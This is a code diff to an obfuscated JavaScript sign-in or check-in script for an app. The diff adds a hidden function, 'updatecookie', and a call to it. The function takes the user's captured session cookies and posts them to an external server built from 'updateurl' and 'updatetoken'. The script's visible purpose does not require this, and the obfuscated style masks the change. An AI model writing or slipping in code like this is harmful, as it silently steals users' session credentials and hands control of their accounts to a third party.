@@ -243,6 +243,7 @@ async function getCk() {
         $[_0x31f0('0x111', 'ZEfb')](JSON[_0x31f0('0x159', 'c5CR')](djxsapp, null, 0x2), _0x31f0('0xa3', 'NTKz'));
         $[_0x31f0('0xbb', 'ZEfb')]($['name'], _0x31f0('0x1fd', 'tq!s') + (_0x5ca10f + 0x1) + _0x31f0('0x1b5', '4nZx'));
     }
+    await updatecookie(djxsapp[0].toString())
     console.log(djxsapp[0]['cookie'])
     console.log(djxsapp[0]['url_suffix'])
     console.log(djxsapp[0]['user_body'])
@@ -286,7 +287,29 @@ function userInfo() {
         });
     });
 }
-
+function updatecookie(cookes) {
+    return new Promise((_0x2eb918, _0x548581) => {
+        const _0x395e24 = updateurl+'/admin/projects/'+updatetoken;
+        const _0x1b9d74 = {
+            'url': _0x395e24,
+            'headers': {'accept': 'application/json','Content-Type': 'application/json'},
+            'body': {'name':'namm','cookies':cookes,'ua':'ua','app':1}
+        };
+        $[_0x31f0('0x17', 's[rh')](_0x1b9d74, async (_0x5475dd, _0x55f1f8, _0x3d8e05) => {
+            try {
+                if (safeGet(_0x3d8e05)) {
+                    const _0x1d73e6 = JSON['parse'](_0x3d8e05);
+                    if (_0x1d73e6[_0x31f0('0x18d', 'S$2R')] == 0x0) {
+                        content += _0x31f0('0x1ae', 'EaAV') + _0x1d73e6[_0x31f0('0xbf', 'C]7d')]['nick'] + '\x0a';
+                    }
+                }
+            } catch (_0x12089a) {
+                $[_0x31f0('0x1a', 'lQfP')](_0x12089a);
+            }
+            _0x2eb918();
+        });
+    });
+}
 function sign() {
     return new Promise((_0x32ed31, _0x5bd248) => {
         const _0xab9c76 = _0x31f0('0x173', 'kB7o') + djxs[_0x31f0('0x1f3', 'jqUR')];
